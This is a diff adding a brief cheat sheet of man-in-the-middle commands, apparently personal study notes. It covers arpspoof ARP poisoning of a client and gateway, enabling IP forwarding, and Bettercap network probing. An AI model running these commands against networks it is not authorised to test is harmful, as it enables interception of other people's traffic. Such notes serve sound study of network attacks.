@@ -1,0 +1,18 @@
+######### MITM #######################
+
+#) check arp table : 
+	arp -a
+
+#) enable port forwarding :
+	echo 1 > /proc/sys/net/ipv4/ip_forward
+
+1) arpspoof :
+	arpspoof -i [interface] -t [client-ip] [gateway]
+	arpspoof -i [interface] -t [gateway] [client-ip]
+2) Bettercap : 
+	bettercap -iface <interface> : start bettercap
+	help : to see list and status of modules
+	help <module name> : help for a specific module 
+        ## after starting
+        net.probe on : to start collecting udp packets
+        net.show : show all clients on the same network
